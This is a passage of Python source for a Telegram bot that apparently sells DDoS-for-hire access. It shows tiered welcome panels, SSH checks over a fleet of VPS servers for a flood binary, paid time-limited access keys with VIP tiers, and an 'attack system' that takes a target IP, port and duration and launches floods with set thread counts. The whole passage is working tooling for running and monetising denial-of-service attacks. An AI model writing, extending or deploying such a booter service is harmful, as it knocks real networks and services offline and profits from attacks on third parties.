        'has_key': user_id in redeemed_users
    }
    save_data()  # Save the updated user data
    
    # Check for referral code
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        handle_referral(message, referral_code)
    
    now = datetime.datetime.now()
    current_time = now.strftime('%H:%M:%S')
    current_date = now.strftime('%Y-%m-%d')

    chat_id = message.chat.id
    group_settings = GROUP_SETTINGS.get(str(chat_id), {})
    start_image = group_settings.get('start_image', None)
    owner_name = group_settings.get('owner_name', OWNER_USERNAME)

    username = f"@{user.username}" if user.username else user.first_name
    user_info = f"├ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n└ 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user.id}`"

    if is_owner(user):
        caption = f"""
╭━━━〔 *𝗔𝗗𝗠𝗜𝗡 𝗖𝗘𝗡𝗧𝗘𝗥* 〕━━━╮
*"Master of The Networks" — Access Granted*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🛡️ *𝗦𝗧𝗔𝗧𝗨𝗦:* `ADMIN PRIVILEGES GRANTED`  
🎉 Welcome back, Commander *{user.first_name}*

*─────⟪ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗗𝗘𝗡𝗧𝗜𝗧𝗬 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *Dashboard Ready — Execute Commands Below*
"""
        markup = create_main_keyboard(message)

    elif user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip'):
        caption = f"""
╭━━━〔 *𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦* 〕━━━╮
*"Elite Access Granted" — Welcome Onboard*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🌟 *𝗦𝗧𝗔𝗧𝗨𝗦:* `VIP MEMBER`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *VIP Panel Ready — Explore Your Powers*
"""
        markup = create_vip_keyboard()

    else:
        caption = f"""
╭━━━〔 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
*"Network Access Initiated"*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🚀 *𝗦𝗧𝗔𝗧𝗨𝗦:* `GENERAL ACCESS`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ Buy special key to unlock VIP features Dm @GODxAloneBoY !
"""
        markup = create_main_keyboard(message)

    if start_image:
        try:
            bot.send_photo(
                chat_id, 
                start_image, 
                caption=caption, 
                parse_mode="Markdown", 
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error sending welcome image: {e}")
            bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
    else:
        bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

# ======================
# 🖥️ VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_vps_status(message):
    """Show status of all VPS servers with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗼𝗿 𝗰𝗼-𝗼𝘄𝗻𝗲𝗿𝘀 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝗩𝗣𝗦 𝘀𝘁𝗮𝘁𝘂𝘀!")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, "❌ 𝗡𝗼 𝗩𝗣𝗦 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱!")
        return
    
    msg = bot.send_message(message.chat.id, "🔄 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗩𝗣𝗦 𝘀𝘁𝘂𝘁𝘂𝘀𝗲𝘀...")
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            if ip in busy_vps_ips:
                status = "🟡 𝗕𝘂𝘀𝘆 (𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸)"
                busy_vps += 1
            else:
                status = "🟢 𝗢𝗻𝗹𝗶𝗻𝗲"
                online_vps += 1
            
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
            else:
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/freeroot/root/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝘄𝗼𝗿𝗸𝗶𝗻𝗴"
                else:
                    binary_status = f"✅ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 (𝗩𝗲𝗿𝘀𝗶𝗼𝗻: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = f"""
🔹𝗩𝗣𝗦 {i+1} 𝗦𝘁𝗮𝘁𝘂𝘀
{status}
𝗜𝗣: `{ip}`
𝗨𝘀𝗲𝗿: `{username}`
𝗕𝗶𝗻𝗮𝗿𝘆: {binary_status}
"""
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = f"""
🔹 𝗩𝗣𝗦 {i+1} 𝗦𝘁𝗮𝘁𝘂𝘀
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲/𝗘𝗿𝗿𝗼𝗿
𝗜𝗣: `{ip}`
𝗨𝘀𝗲𝗿: `{username}`
𝗘𝗿𝗿𝗼𝗿: `{str(e)}`
"""
            status_messages.append(status_msg)
            offline_vps += 1
    
    summary = f"""
📊 𝗩𝗣𝗦 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝘂𝗺𝗺𝗮𝗿𝘆
🟢 𝗢𝗻𝗹𝗶𝗻𝗲: {online_vps}
🟡 𝗕𝘂𝘀𝘆: {busy_vps}
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲: {offline_vps}
𝗧𝗼𝘁𝗮𝗹: {len(VPS_LIST)}
"""
    
    full_message = summary + "\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id, parse_mode="Markdown")
    except:
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                bot.send_message(message.chat.id, part, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, full_message, parse_mode="Markdown")


# ======================
# 🔑 KEY MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🔓 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔")
def generate_key_start(message):
    """Handle key generation initiation with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "⛔ *ACCESS DENIED!*\n\n"
            "Only authorized *Overlords* can forge new access tokens.",
            parse_mode="Markdown")
        return

    # Create selection keyboard
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("10M (5 coins)"),
        telebot.types.KeyboardButton("30M (8 coins)"),
        telebot.types.KeyboardButton("2H (12 coins)"),
        telebot.types.KeyboardButton("5H (15 coins)"),
        telebot.types.KeyboardButton("1D (20 coins)"),
        telebot.types.KeyboardButton("2D (30 coins)"),
        telebot.types.KeyboardButton("1W (100 coins)"),
        telebot.types.KeyboardButton("VIP1D (50 coins)"),
        telebot.types.KeyboardButton("VIP2D (80 coins)"),
        telebot.types.KeyboardButton("❌ Cancel")
    ]
    markup.add(*buttons)

    # Styled panel message
    bot.reply_to(message, 
        f"""
╭━━━〔 *🧿 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗜𝗢𝗡 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
       *"Only the Architect may shape access."*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🔐 *𝗖𝗛𝗢𝗢𝗦𝗘 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:*  
━━━━━━━━━━━━━━━━━━━━━━━  
🔹 `10M`  → 💰 *5 Coins*  
🔹 `30M`  → 💰 *8 Coins*  
🔹 `2H`   → 💰 *12 Coins*  
🔹 `5H`   → 💰 *15 Coins*  
🔹 `1D`   → 💰 *20 Coins*  
🔹 `2D`   → 💰 *30 Coins*  
🔹 `1W`   → 💰 *100 Coins*

🌟 *𝗩𝗜𝗣 𝗞𝗘𝗬𝗦:*  
━━━━━━━━━━━━━━━━━━━━━━━  
💎 `VIP1D` → 💰 *50 Coins*  
💎 `VIP2D` → 💰 *80 Coins*

🧠 *All keys are encrypted and time-limited*  
🛰️ *VIP keys grant elite-level network execution rights*

━━━━━━━━━━━━━━━━━━━━━━━  
🔔 *Select your key type from the menu below*  
❌ *Cancel anytime with:* ❌ Cancel
""",
        parse_mode="Markdown",
        reply_markup=markup
    )
    bot.register_next_step_handler(message, process_key_duration)

def process_key_duration(message):
    """Process key duration selection with premium styling"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "🚫 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗.", reply_markup=create_main_keyboard(message))
        return

    try:
        duration_str = message.text.split()[0]  # Extract "1H", "VIP1D" etc.
        if duration_str not in KEY_PRICES:
            raise ValueError("Invalid duration")

        # Generate unique key
        key_prefix = "VIP-" if duration_str.startswith("VIP") else ""
        unique_code = os.urandom(3).hex().upper()
        key = f"{key_prefix}{OWNER_USERNAME}-{duration_str}-{unique_code}"

        # Store key based on type
        expiry_seconds = (
            int(duration_str[3:-1]) * 86400 if duration_str.startswith("VIP") 
            else int(duration_str[:-1]) * 3600 if duration_str.endswith("H") 
            else int(duration_str[:-1]) * 86400
        )

        if duration_str.startswith("VIP"):
            vip_keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }
        else:
            keys[key] = {
                'expiration_time': time.time() + expiry_seconds,
                'generated_by': str(message.from_user.id)
            }

        save_data()

        # Send key to admin
        bot.send_message(
            message.chat.id,
            f"🔐 𝗡𝗘𝗪 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!\n\n"
            f"• 𝗧𝘆𝗽𝗲: `{duration_str}`\n"
            f"• 𝗞𝗲𝘆: `{key}`\n"
            f"• 𝗩𝗮𝗹𝗶𝗱 𝗳𝗼𝗿: {duration_str}\n"
            f"• 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: @{message.from_user.username}",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message)
        )

        # Log to owner
        if str(message.from_user.id) not in ADMIN_IDS:
            bot.send_message(
                ADMIN_IDS[0],
                f"📝 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 𝗟𝗢𝗚\n\n"
                f"• 𝗕𝘆: @{message.from_user.username}\n"
                f"• 𝗞𝗲𝘆: `{key}`\n"
                f"• 𝗧𝘆𝗽𝗲: {duration_str}"
            )

    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗥𝗥𝗢𝗥: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔")
def redeem_key_start(message):
    """Start key redemption process with premium styling"""
    if not is_allowed_group(message):
        bot.reply_to(message, "❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗴𝗿𝗼𝘂𝗽!")
        return
    
    bot.reply_to(message, "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗸𝗲𝘆 𝘁𝗼 𝗿𝗲𝗱𝗲𝗲𝗺.", parse_mode="Markdown")
    bot.register_next_step_handler(message, redeem_key_input)
    
def redeem_key_input(message):
    """Process key redemption with premium styling"""
    key = message.text.strip()
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Check normal keys
    if key in keys:
        expiry_time = keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "❌ 𝗞𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': False
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key
        }
        
        del keys[key]
        
    # Check VIP keys
    elif key in vip_keys:
        expiry_time = vip_keys[key]['expiration_time']
        if time.time() > expiry_time:
            bot.reply_to(message, "❌ 𝗩𝗜𝗣 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱!")
            return
            
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': vip_keys[key]['generated_by'],
            'expiration_time': expiry_time,
            'is_vip': True
        }
        
        redeemed_users[user_id] = {
            'expiration_time': expiry_time,
            'key': key,
            'is_vip': True
        }
        
        del vip_keys[key]
        
    else:
        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗰𝗵𝗲𝗰𝗸 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
    
    save_data()
    
    remaining_time = expiry_time - time.time()
    hours = int(remaining_time // 3600)
    minutes = int((remaining_time % 3600) // 60)
    
    if redeemed_users[user_id].get('is_vip'):
        response = f"""
🌟 𝗩𝗜𝗣 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺

🔥 𝗩𝗜𝗣 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦:
• Max Duration: {VIP_MAX_DURATION}𝘀
• Max Threads: {VIP_MAX_THREADS}
• Priority Queue Access
• No Cooldowns
"""
    else:
        response = f"""
✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!

🔑 𝗞𝗲𝘆: `{key}`
⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {hours}𝗵 {minutes}𝗺
"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
    
    # Notify owner
    if not is_admin(user):
        try:
            bot.send_message(
                ADMIN_IDS[0], 
                f"🔑 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗\n\n"
                f"• 𝗨𝘀𝗲𝗿: @{user.username if user.username else user.first_name}\n"
                f"• 𝗞𝗲𝘆: `{key}`\n"
                f"• 𝗧𝘆𝗽𝗲: {'VIP' if redeemed_users[user_id].get('is_vip') else 'Normal'}"
            )
        except:
            pass

@bot.message_handler(func=lambda msg: msg.text == "📋 𝙆𝙀𝙔 𝙇𝙄𝙎𝙏")
def show_key_list(message):
    """Show list of all active and redeemed keys with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘃𝗶𝗲𝘄 𝗸𝗲𝘆 𝗹𝗶𝘀𝘁!")
        return

    # Helper functions
    def get_username(user_id):
        try:
            user = bot.get_chat(user_id)
            return f"@{user.username}" if user.username else user.first_name
        except:
            return str(user_id)

    def format_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}𝘀"
        elif seconds < 3600:
            return f"{int(seconds//60)}𝗺"
        elif seconds < 86400:
            return f"{int(seconds//3600)}𝗵"
        else:
            return f"{int(seconds//86400)}𝗱"

    current_time = time.time()

    # Prepare sections
    sections = []
    
    # 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗢𝗥𝗠𝗔𝗟 𝗞𝗘𝗬𝗦
    active_normal = []
    for key, details in keys.items():
        if details['expiration_time'] > current_time:
            active_normal.append(
                f"🔹 <code>{key}</code>\n"
                f"├ 𝗧𝘆𝗽𝗲: 𝗡𝗢𝗥𝗺𝗮𝗹\n"
                f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
                f"└ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_normal:
        sections.append("🍅 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗢𝗥𝗠𝗔𝗟 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_normal))

    # 𝗔𝗖𝗧𝗜𝗩𝗘 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦
    active_vip = []
    for key, details in vip_keys.items():
        if details['expiration_time'] > current_time:
            active_vip.append(
                f"💎 <code>{key}</code>\n"
                f"├ 𝗧𝘆𝗽𝗲: 𝗩𝗜𝗣\n"
                f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
                f"└ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻: {format_time(details['expiration_time'] - current_time)}\n"
            )
    if active_vip:
        sections.append("\n🌟 𝗔𝗖𝗧𝗜𝗩𝗘 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_vip))

    # 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦
    redeemed = []
    for key, details in redeemed_keys_info.items():
        status = "✅ 𝗔𝗰𝘁𝗶𝘃𝗲" if details['expiration_time'] > current_time else "❌ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
        redeemed.append(
            f"🔓 <code>{key}</code>\n"
            f"├ 𝗧𝘆𝗽𝗲: {'𝗩𝗜𝗣' if details.get('is_vip') else '𝗡𝗼𝗿𝗺𝗮𝗹'}\n"
            f"├ 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
            f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {get_username(details['generated_by'])}\n"
            f"└ 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗯𝘆: {get_username(details['redeemed_by'])}\n"
        )
    if redeemed:
        sections.append("\n🔑 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦:\n" + "\n".join(redeemed))

    if not sections:
        sections.append("ℹ️ 𝗡𝗼 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺")

    full_message = "\n".join(sections)

    # Send with original fonts and copy feature
    bot.send_message(
        message.chat.id,
        full_message,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda msg: msg.text == "🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔")
def delete_key_start(message):
    """Initiate key deletion process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "❌ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗱𝗲𝗹𝗲𝘁𝗲 𝗸𝗲𝘆𝘀!")
        return

    bot.reply_to(message, 
        "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗸𝗲𝘆 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗱𝗲𝗹𝗲𝘁𝗲:\n\n"
        "𝗙𝗼𝗿𝗺𝗮𝘁: <𝗸𝗲𝘆>\n"
        "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: GODxAloneBOY-1H-ABC123",
        parse_mode="Markdown")
    bot.register_next_step_handler(message, process_key_deletion)

def process_key_deletion(message):
    """Process key deletion with premium styling"""
    key = message.text.strip()
    deleted = False

    # Check in active normal keys
    if key in keys:
        del keys[key]
        deleted = True
    # Check in active VIP keys
    elif key in vip_keys:
        del vip_keys[key]
        deleted = True
    # Check in redeemed keys info
    elif key in redeemed_keys_info:
        # Also remove from redeemed_users if exists
        user_id = redeemed_keys_info[key]['redeemed_by']
        if user_id in redeemed_users:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        deleted = True

    if deleted:
        save_data()
        bot.reply_to(message, 
            f"✅ 𝗞𝗲𝘆 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n"
            f"𝗞𝗲𝘆: `{key}`",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message, 
            "❌ 𝗞𝗲𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻:\n"
            "- Active keys\n"
            "- VIP keys\n"
            "- Redeemed keys",
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message))

# ======================
# 🚀 ATTACK SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text in ["🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃", "🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"])
def attack_start(message):
    """Start attack process with premium styling and strict limits"""
    # Check if this is a public group attack
    is_public = message.chat.id in PUBLIC_GROUPS and not is_authorized_user(message.from_user)
    
    if is_public:
        bot.reply_to(message, 
            "⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:\n\n"
            "<𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>\n\n"
            "• 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: 𝟭𝟮𝟬𝘀\n"
            "• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 1800 (𝗳𝗶𝘅𝗲𝗱)")
        bot.register_next_step_handler(message, process_public_attack_args)
        return
    
    # Original authorization check for private/VIP attacks
    if not is_authorized_user(message.from_user):
        bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸!")
        return
    
    global last_attack_time
    current_time = time.time()
    user_id = str(message.from_user.id)
    
    # Check cooldown (skip for VIP)
    is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
    if not is_vip and current_time - last_attack_time < global_cooldown:
        remaining = int(global_cooldown - (current_time - last_attack_time))
        bot.reply_to(message, f"⌛ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗮𝗰𝘁𝗶𝘃𝗲. 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}𝘀")
        return
    
    # Determine max duration based on user type
    max_duration = VIP_MAX_DURATION if is_vip else MAX_DURATION
    
    bot.reply_to(message, 
        f"⚠️ 𝗘𝗻𝘁𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗲𝘁𝗮𝗶𝗹𝘀:\n\n"
        f"<𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>\n\n"
        f"{'🌟 𝗩𝗜𝗣 𝗣𝗥𝗜𝗩𝗜𝗟𝗘𝗚𝗘𝗦' if is_vip else '🔹 𝗡𝗢𝗥𝗠𝗔𝗟 𝗔𝗖𝗖𝗘𝗦𝗦'}\n"
        f"• 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {max_duration}𝘀\n"
        f"• 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {VIP_MAX_THREADS if is_vip else SPECIAL_MAX_THREADS if user_id in special_keys else MAX_THREADS}")
    bot.register_next_step_handler(message, process_attack_args)

def process_public_attack_args(message):
    """Process attack arguments for public mode with strict limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        threads = 900  # Fixed thread count for public attacks
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            # Enforce public attack limits strictly
            if duration > 120:
                raise ValueError("❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝟭𝟮𝟬𝘀 𝗳𝗼𝗿 𝗽𝘂𝗯𝗹𝗶𝗰 𝗮𝘁𝘁𝗮𝗰𝗸𝘀")
                
            # Start attack with public limitations
            start_attack(message, ip, port, duration, threads, is_public=True)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def process_attack_args(message):
    """Process attack arguments with strict enforcement of VIP/normal limits"""
    try:
        args = message.text.split()
        if len(args) != 3:
            raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁! 𝗨𝘀𝗲: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
            
        ip, port, duration = args
        
        # Validate and enforce limits
        try:
            ipaddress.ip_address(ip)
            port = int(port)
            duration = int(duration)
            
            if not 1 <= port <= 65535:
                raise ValueError("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 (𝟭-𝟲𝟱𝟱𝟯𝟱)")
            
            user_id = str(message.from_user.id)
            is_vip = user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip')
            is_special = user_id in special_keys
            
            # Determine thread count based on user type
            if is_vip:
                threads = VIP_MAX_THREADS
                max_duration = VIP_MAX_DURATION
            elif is_special:
                threads = SPECIAL_MAX_THREADS
                max_duration = SPECIAL_MAX_DURATION
            else:
                threads = MAX_THREADS
                max_duration = MAX_DURATION
            
            if duration > max_duration:
                raise ValueError(f"❌ 𝗠𝗮𝘅 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 {max_duration}𝘀 {'(𝗩𝗜𝗣)' if is_vip else '(𝗦𝗽𝗲𝗰𝗶𝗮𝗹)' if is_special else ''}")
                
            # Start attack
            start_attack(message, ip, port, duration, threads)
            
        except ValueError as e:
            raise ValueError(str(e))
            
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

